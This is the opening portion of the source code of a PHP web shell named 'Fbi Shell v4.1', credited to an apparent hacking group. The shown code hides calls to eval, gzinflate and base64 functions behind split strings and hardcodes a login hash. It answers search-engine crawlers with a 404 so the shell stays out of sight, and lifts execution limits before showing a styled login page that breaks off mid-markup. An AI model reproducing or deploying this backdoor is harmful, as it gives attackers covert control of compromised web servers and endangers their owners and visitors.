<?php
/*
	Author: 	Solevisible/Fbi-Team
	Telegram: 	https://telegram.me/solevisible
	YouTube: 	https://youtube.com/solevisible
	Gmail:		solevisible@gmail.com
	Date:		Monday, September 14, 2020
*/
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'fbi',
    'password' => 'a6f452ec3293d7fb72c5b677257b20ec',//md5(ehsan)
    'safe_mode' => '0',
    'login_page' => '403',
    'show_icons' => '1',
    'post_encryption' => false,
    'cgi_api' => true,
);

$CWppUDJxuf = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
$aztJtafUXm = 'cha' . 'r' . 'C' . 'o' . 'd' . 'e' . 'A' . 't' . '';
$OVpGNqqFZs = 'e' . 'v' . 'al';
$psDEwGhsxg = 'gz' . 'inf' . 'late';

if (!$CWppUDJxuf('b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . ''))
{
    function vcnvSCZgBz($data)
    {
        if (empty($data)) return;
        $b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
        $o1 = $o2 = $o3 = $h1 = $h2 = $h3 = $h4 = $bits = $i = 0;
        $ac = 0;
        $enc = '';
        $tmp_arr = array();
        if (!$data)
        {
            return $data;
        }
        do
        {
            $o1 = $aztJtafUXm($data, $i++);
            $o2 = $aztJtafUXm($data, $i++);
            $o3 = $aztJtafUXm($data, $i++);
            $bits = $o1 << 16 | $o2 << 8 | $o3;
            $h1 = $bits >> 18 & 0x3f;
            $h2 = $bits >> 12 & 0x3f;
            $h3 = $bits >> 6 & 0x3f;
            $h4 = $bits & 0x3f;
            $tmp_arr[$ac++] = charAt($b64, $h1) . charAt($b64, $h2) . charAt($b64, $h3) . charAt($b64, $h4);
        }
        while ($i < strlen($data));
        $enc = implode($tmp_arr, '');
        $r = (strlen($data) % 3);
        return ($r ? substr($enc, 0, ($r - 3)) : $enc) . substr('===', ($r || 3));
    }
    function charCodeAt($data, $char)
    {
        return ord(substr($data, $char, 1));
    }
    function charAt($data, $char)
    {
        return substr($data, $char, 1);
    }
}
else
{
    function vcnvSCZgBz($s)
    {
        $b = 'b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . '';
        return $b($s);
    }
}
if (!$CWppUDJxuf('b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . ''))
{
    function zRtSHsbTzV($input)
    {
        if (empty($input)) return;
        $keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        $chr1 = $chr2 = $chr3 = "";
        $enc1 = $enc2 = $enc3 = $enc4 = "";
        $i = 0;
        $output = "";
        $input = preg_replace("[^A-Za-z0-9\+\/\=]", "", $input);
        do
        {
            $enc1 = strpos($keyStr, substr($input, $i++, 1));
            $enc2 = strpos($keyStr, substr($input, $i++, 1));
            $enc3 = strpos($keyStr, substr($input, $i++, 1));
            $enc4 = strpos($keyStr, substr($input, $i++, 1));
            $chr1 = ($enc1 << 2) | ($enc2 >> 4);
            $chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);
            $chr3 = (($enc3 & 3) << 6) | $enc4;
            $output = $output . chr((int)$chr1);
            if ($enc3 != 64)
            {
                $output = $output . chr((int)$chr2);
            }
            if ($enc4 != 64)
            {
                $output = $output . chr((int)$chr3);
            }
            $chr1 = $chr2 = $chr3 = "";
            $enc1 = $enc2 = $enc3 = $enc4 = "";
        }
        while ($i < strlen($input));
        return $output;
    }
}
else
{
    function zRtSHsbTzV($s)
    {
        $b = 'b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . '';
        return $b($s);
    }
}

function __ZW5jb2Rlcg($s)
{
    return vcnvSCZgBz($s);
}
function __ZGVjb2Rlcg($s)
{
    return zRtSHsbTzV($s);
}

$GLOBALS['DB_NAME'] = $GLOBALS['oZgNypoPRU'];

foreach ($GLOBALS['DB_NAME'] as $key => $value)
{
	$prefix = substr($key, 0, 2);
	if ($prefix == "us")
	{
		$GLOBALS['DB_NAME']["user"] = $value;
		$GLOBALS['DB_NAME']["user_rand"] = $key;
	}
	elseif ($prefix == "pa")
	{
		$GLOBALS['DB_NAME']["pass"] = $value;
		$GLOBALS['DB_NAME']["pass_rand"] = $key;
	}
	elseif ($prefix == "sa")
	{
		$GLOBALS['DB_NAME']["safemode"] = $value;
		$GLOBALS['DB_NAME']["safemode_rand"] = $key;
	}
	elseif ($prefix == "lo")
	{
		$GLOBALS['DB_NAME']["login_page"] = $value;
		$GLOBALS['DB_NAME']["login_page_rand"] = $key;
	}
	elseif ($prefix == "sh")
	{
		$GLOBALS['DB_NAME']["show_icons"] = $value;
		$GLOBALS['DB_NAME']["show_icons_rand"] = $key;
	}
	elseif ($prefix == "po")
	{
		$GLOBALS['DB_NAME']["post_encryption"] = $value;
		$GLOBALS['DB_NAME']["post_encryption_rand"] = $key;
	}
	elseif ($prefix == "cg")
	{
		$GLOBALS['DB_NAME']["cgi_api"] = $value;
		$GLOBALS['DB_NAME']["cgi_api_rand"] = $key;
	}
}

unset($GLOBALS['oZgNypoPRU']);

if (!isset($_SERVER["HTTP_HOST"])) exit();

if(!empty($_SERVER['HTTP_USER_AGENT'])){$userAgents = array("Google","Slurp","MSNBot","ia_archiver","Yandex","Rambler","bot","spider");if(preg_match('/'.implode('|',$userAgents).'/i',$_SERVER['HTTP_USER_AGENT'])){header('HTTP/1.0 404 Not Found');exit;}}
if(!isset($GLOBALS['DB_NAME']['user']))exit('$GLOBALS[\'DB_NAME\'][\'user\']');
if(!isset($GLOBALS['DB_NAME']['pass']))exit('$GLOBALS[\'DB_NAME\'][\'pass\']');
if(!isset($GLOBALS['DB_NAME']['safemode']))exit('$GLOBALS[\'DB_NAME\'][\'safemode\']');
if(!isset($GLOBALS['DB_NAME']['login_page']))exit('$GLOBALS[\'DB_NAME\'][\'login_page\']');
if(!isset($GLOBALS['DB_NAME']['show_icons']))exit('$GLOBALS[\'DB_NAME\'][\'show_icons\']');
if(!isset($GLOBALS['DB_NAME']['post_encryption']))exit('$GLOBALS[\'DB_NAME\'][\'post_encryption\']');
define("__FBI_VERSION__", "4.1");
define("__FBI_UPDATE__", "2");
define("__FBI_CODE_NAME__", "Tesla");
define("__FBI_DATA_FOLDER__", "FBI_DATA");
define("__FBI_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
define("__FBI_SECRET_KEY__", __FBI_POST_ENCRYPTION__?_FbiSecretKey():'');
$GLOBALS['__FBI_COLOR__'] = array(
		"shell_border" => array(
			"key_color" => "#1e1e2e",
			"multi_selector" => array(
				".header" => "border: 1px solid {color};",
				"#meunlist" => "border-color: {color}",
				"#hidden_sh" => "background: linear-gradient(135deg, {color}, #2d1b69);",
				".ajaxarea" => "border: 1px solid {color}",
				".foot" => "border-color: {color}",
			)
		),
		"header_vars" => "#94a3b8",
		"header_values" => "#e2e8f0",
		"header_on" => "#22c55e",
		"header_off" => "#ef4444",
		"header_none" => "#64748b",
		"home_shell" => "#8b5cf6",
		"home_shell:hover" => array(
			"key_color" => "#a78bfa",
			"multi_selector" => array(
				".home_shell:hover" => "color: {color};",
			)
		),
		"back_shell" => "#06b6d4",
		"back_shell:hover" => array(
			"key_color" => "#22d3ee",
			"multi_selector" => array(
				".back_shell:hover" => "color: {color};",
			)
		),
		"header_pwd" => "#06b6d4",
		"header_pwd:hover" => array(
			"key_color" => "#22d3ee",
			"multi_selector" => array(
				".header_pwd:hover" => "color: {color};",
			)
		),
		"header_drive" => "#8b5cf6",
		"header_drive:hover" => array(
			"key_color" => "#a78bfa",
			"multi_selector" => array(
				".header_drive:hover" => "color: {color};",
			)
		),
		"header_show_all" => "#22c55e",
		"disable_functions" => "#f87171",
		"footer_text" => "#94a3b8",
		"menu_options" => "#cbd5e1",
		"menu_options:hover" => array(
			"key_color" => "rgba(139, 92, 246, 0.25)",
			"multi_selector" => array(
				".menu_options:hover" => "background-color: {color};font-weight: 600;",
			)
		),
		"options_list" => array(
			"key_color" => "#8b5cf6",
			"multi_selector" => array(
				".content_options_holder .header center a" => "color: {color};",
			)
		),
		"options_list:hover" => array(
			"key_color" => "#a78bfa",
			"multi_selector" => array(
				".content_options_holder .header center a:hover" => "color: {color};",
			)
		),
		"options_list_header" => array(
			"key_color" => "#a78bfa",
			"multi_selector" => array(
				".txtfont_header" => "color: {color};",
			)
		),
		"options_list_text" => array(
			"key_color" => "#e2e8f0",
			"multi_selector" => array(
				".txtfont,.tbltxt" => "color: {color};",
			)
		),
		"Fbi+" => array(
			"key_color" => "#22d3ee",
			"multi_selector" => array(
				".fbi_plus" => "color: {color};font-weight: 600;",
			)
		),
		"hidden_shell_text" => array(
			"key_color" => "#a78bfa",
			"multi_selector" => array(
				"#hidden_sh a" => "color: {color};",
			)
		),
		"hidden_shell_version" => "#06b6d4",
		"shell_name" => "#ef4444",
		"main_row:hover" => array(
			"key_color" => "rgba(139, 92, 246, 0.12)",
			"multi_selector" => array(
				".main tr:hover" => "background-color: {color};",
			)
		),
		"main_header" => array(
			"key_color" => "#94a3b8",
			"multi_selector" => array(
				".main th" => "color: {color};",
			)
		),
		"main_name" => array(
			"key_color" => "#e2e8f0",
			"multi_selector" => array(
				".main .main_name" => "color: {color};font-weight: 500;",
			)
		),
		"main_size" => "#64748b",
		"main_modify" => "#64748b",
		"main_owner_group" => "#64748b",
		"main_green_perm" => "#22c55e",
		"main_red_perm" => "#ef4444",
		"main_white_perm" => "#94a3b8",
		"beetween_perms" => "#475569",
		"main_actions" => array(
			"key_color" => "#8b5cf6",
			"multi_selector" => array(
				".main .actions" => "color: {color};",
			)
		),
		"minimize_editor_background" => array(
			"key_color" => "#1e1e2e",
			"multi_selector" => array(
				".minimized-wrapper" => "background: linear-gradient(135deg, {color}, #2d1b69);",
			)
		),
		"minimize_editor_text" => array(
			"key_color" => "#e2e8f0",
			"multi_selector" => array(
				".minimized-text" => "color: {color};",
			)
		),
		"editor_border" => array(
			"key_color" => "rgba(139, 92, 246, 0.35)",
			"multi_selector" => array(
				".editor-explorer,.editor-modal" => "border: 1px solid {color};",
			)
		),
		"editor_background" => array(
			"key_color" => "rgba(15, 15, 25, 0.95)",
			"multi_selector" => array(
				".editor-explorer,.editor-modal" => "background-color: {color};",
			)
		),
		"editor_header_background" => array(
			"key_color" => "rgba(30, 30, 46, 0.98)",
			"multi_selector" => array(
				".editor-header" => "background-color: {color};",
			)
		),
		"editor_header_text" => array(
			"key_color" => "#a78bfa",
			"multi_selector" => array(
				".editor-path" => "color: {color};",
			)
		),
		"editor_header_button" => array(
			"key_color" => "rgba(139, 92, 246, 0.4)",
			"multi_selector" => array(
				".close-button, .editor-minimize" => "background-color: {color};",
			)
		),
		"editor_actions" => array(
			"key_color" => "#8b5cf6",
			"multi_selector" => array(
				".editor_actions" => "color: {color};",
			)
		),
		"editor_file_info_vars" => array(
			"key_color" => "#94a3b8",
			"multi_selector" => array(
				".editor_file_info_vars" => "color: {color};",
			)
		),
		"editor_file_info_values" => array(
			"key_color" => "#e2e8f0",
			"multi_selector" => array(
				".filestools" => "color: {color};",
			)
		),
		"editor_history_header" => array(
			"key_color" => "#a78bfa",
			"multi_selector" => array(
				".hheader-text,.history-clear" => "color: {color};",
			)
		),
		"editor_history_list" => array(
			"key_color" => "#06b6d4",
			"multi_selector" => array(
				".editor-file-name" => "color: {color};",
			)
		),
		"editor_history_selected_file" => array(
			"key_color" => "rgba(139, 92, 246, 0.2)",
			"multi_selector" => array(
				".is_active" => "background-color: {color};",
			)
		),
		"editor_history_file:hover" => array(
			"key_color" => "rgba(139, 92, 246, 0.15)",
			"multi_selector" => array(
				".file-holder > .history:hover" => "background-color: {color};",
			)
		),
		"input_box_border" => array(
			"key_color" => "rgba(139, 92, 246, 0.3)",
			"multi_selector" => array(
				"input[type=text],textarea" => "border: 1px solid {color}",
			)
		),
		"input_box_text" => array(
			"key_color" => "#e2e8f0",
			"multi_selector" => array(
				"input[type=text],textarea" => "color: {color};",
			)
		),
		"input_box:hover" => array(
			"key_color" => "#8b5cf6",
			"multi_selector" => array(
				"input[type=text]:hover,textarea:hover" => "box-shadow:0 0 0 3px rgba(139,92,246,0.15);border:1px solid {color};",
			)
		),
		"select_box_border" => array(
			"key_color" => "rgba(139, 92, 246, 0.3)",
			"multi_selector" => array(
				"select" => "border: 1px solid {color}",
			)
		),
		"select_box_text" => array(
			"key_color" => "#e2e8f0",
			"multi_selector" => array(
				"select" => "color: {color};",
			)
		),
		"select_box:hover" => array(
			"key_color" => "#8b5cf6",
			"multi_selector" => array(
				"select:hover" => "box-shadow:0 0 0 3px rgba(139,92,246,0.15);border:1px solid {color};",
			)
		),
		"button_border" => array(
			"key_color" => "rgba(139, 92, 246, 0.5)",
			"multi_selector" => array(
				"input[type=submit],.button,#addup" => "border: 1px solid {color};",
			)
		),
		"button:hover" => array(
			"key_color" => "#8b5cf6",
			"multi_selector" => array(
				"input[type=submit]:hover" => "box-shadow:0 0 20px rgba(139,92,246,0.4);border:1px solid {color};",
				".button:hover,#addup:hover" => "box-shadow:0 0 20px rgba(139,92,246,0.4);border:1px solid {color};",
			)
		),
		"outputs_text" => array(
			"key_color" => "#e2e8f0",
			"multi_selector" => array(
				".ml1" => "color: {color};",
			)
		),
		"outputs_border" => array(
			"key_color" => "rgba(139, 92, 246, 0.25)",
			"multi_selector" => array(
				".ml1" => "border: 1px solid {color};",
			)
		),
		"uploader_border" => array(
			"key_color" => "rgba(139, 92, 246, 0.35)",
			"multi_selector" => array(
				".inputfile" => "box-shadow:none;border:1px dashed {color};",
			)
		),
		"uploader_background" => array(
			"key_color" => "rgba(139, 92, 246, 0.2)",
			"multi_selector" => array(
				".inputfile strong" => "background-color: {color};",
			)
		),
		"uploader_text_right" => array(
			"key_color" => "#e2e8f0",
			"multi_selector" => array(
				".inputfile strong" => "color: {color};",
			)
		),
		"uploader_text_left" => array(
			"key_color" => "#a78bfa",
			"multi_selector" => array(
				".inputfile span" => "color: {color};",
			)
		),
		"uploader:hover" => array(
			"key_color" => "#8b5cf6",
			"multi_selector" => array(
				".inputfile:hover" => "box-shadow:0 0 0 3px rgba(139,92,246,0.15);border:1px solid {color};",
			)
		),
		"uploader_progress_bar" => array(
			"key_color" => "linear-gradient(90deg, #8b5cf6, #06b6d4)",
			"multi_selector" => array(
				".up_bar" => "background: {color};",
			)
		),
		"mysql_tables" => "#a78bfa",
		"mysql_table_count" => "#64748b",
		"copyright" => "#64748b",
		"scrollbar" => array(
			"key_color" => "rgba(139, 92, 246, 0.6)",
			"multi_selector" => array(
				"*::-webkit-scrollbar-thumb" => "background-color: {color};",
			)
		),
		"scrollbar_background" => array(
			"key_color" => "#0f0f17",
			"multi_selector" => array(
				"*::-webkit-scrollbar-track" => "background-color: {color};",
			)
		),
);
$GLOBALS['__file_path'] = str_replace('\\','/',trim(preg_replace('!\(\d+\)\s.*!', '', __FILE__)));
$config = array('FbiUser' => $GLOBALS['DB_NAME']['user'],'FbiPass' => $GLOBALS['DB_NAME']['pass'],'FbiProtectShell' => $GLOBALS['DB_NAME']['safemode'],'FbiLoginPage' => $GLOBALS['DB_NAME']['login_page']);
//@session_start();
@session_write_close();
@ignore_user_abort(true);
@set_time_limit(0);
@ini_set('memory_limit', '-1');
@ini_set("upload_max_filesize", "9999m");
if($config['FbiProtectShell']){
$SERVER_SIG = (isset($_SERVER["SERVER_SIGNATURE"])?$_SERVER["SERVER_SIGNATURE"]:"");
$Eform='<form method="post"><input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="password"></form>';
if($config['FbiLoginPage'] == 'gui'){
if(@$_COOKIE["FbiUser"] != $config['FbiUser'] && $_COOKIE["FbiPass"] != md5($config['FbiPass'])){
if(@$_POST["usrname"]==$config['FbiUser'] && @md5($_POST["password"])==$config['FbiPass']){
__fbi_set_cookie("FbiUser", $config['FbiUser']);
__fbi_set_cookie("FbiPass", @md5($config['FbiPass']));
@header('location: '.$_SERVER["PHP_SELF"]);
}
echo '
<style>
@import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap");
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0a0f!important;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:"Inter",system-ui,sans-serif;overflow:hidden}
body::before{content:"";position:fixed;inset:0;background:radial-gradient(ellipse 80% 50% at 50% -20%,rgba(139,92,246,.2),transparent),radial-gradient(ellipse 60% 40% at 100% 100%,rgba(6,182,212,.12),transparent);pointer-events:none;z-index:0}
body>center,body>div{position:relative;z-index:1}
body>center>img{display:none!important}
#loginbox{position:relative!important;top:auto!important;right:auto!important;width:min(420px,92vw)!important;height:auto!important;font-size:14px;color:#e2e8f0;border-radius:20px!important;overflow:hidden;box-shadow:0 25px 60px rgba(0,0,0,.5),0 0 0 1px rgba(139,92,246,.2)}
#ap_table{width:100%!important;border:none!important}
#ap_table>tbody>tr>td:first-child{background:transparent!important;padding:0!important}
#ap_table table{width:100%;border-collapse:collapse}
#ap_table tr:first-child td{background:linear-gradient(135deg,rgba(139,92,246,.9),rgba(109,40,217,.9))!important;padding:20px!important;text-align:center;border-radius:20px 20px 0 0}
#ap_table tr:first-child b{font-size:15px!important;font-weight:700;letter-spacing:.02em}
#ap_table tr:last-child td{background:rgba(18,18,28,.95)!important;backdrop-filter:blur(20px);padding:28px 24px!important;border-radius:0 0 20px 20px}
#loginbox form table{width:100%}
#loginbox form td{padding:8px 0!important;display:block;width:100%}
#loginbox form tr{display:block;margin-bottom:4px}
#loginbox form tr:last-child td{text-align:center;padding-top:16px!important}
#loginbox font{color:#94a3b8!important;font-family:"Inter",sans-serif!important;font-size:13px!important;font-weight:500}
#loginbox input[type=text],#loginbox input[type=password]{width:100%!important;max-width:100%;padding:12px 16px!important;background:rgba(15,15,25,.8)!important;border:1px solid rgba(139,92,246,.3)!important;border-radius:12px!important;color:#e2e8f0!important;font-family:"Inter",sans-serif!important;font-size:14px!important;outline:none;transition:all .25s ease;box-sizing:border-box}
#loginbox input[type=text]:focus,#loginbox input[type=password]:focus{border-color:#8b5cf6!important;box-shadow:0 0 0 3px rgba(139,92,246,.2)}
#loginbox input[type=submit]{width:100%!important;padding:12px 24px!important;background:linear-gradient(135deg,#8b5cf6,#7c3aed)!important;border:none!important;border-radius:12px!important;color:#fff!important;font-family:"Inter",sans-serif!important;font-size:14px!important;font-weight:600!important;cursor:pointer;transition:all .3s ease;height:auto!important;min-height:44px}
#loginbox input[type=submit]:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(139,92,246,.4)}
</style>
<title>~ Fbi Shell-v'.__FBI_VERSION__.'-'.__FBI_CODE_NAME__.' ~</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="Fbi 2012" draggable="false" src="http://solevisible.org/images/fbi-iran.png" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ Fbi Shell-v'.__FBI_VERSION__.'-'.__FBI_CODE_NAME__.' ~</b></font></th></tr>
<tr><td bgcolor="black" style="padding:5">
<form method="post">
<input type="hidden" name="action" value="login">
<input type="hidden" name="hide" value="">
<center><table>
<tr><td><font color="green" face="verdana,arial" size=-1>Login:</font></td><td><input type="text" size="30" name="usrname" placeholder="username" onfocus="if (this.value == \'username\'){this.value = \'\';}"></td></tr>
<tr><td><font color="green" face="verdan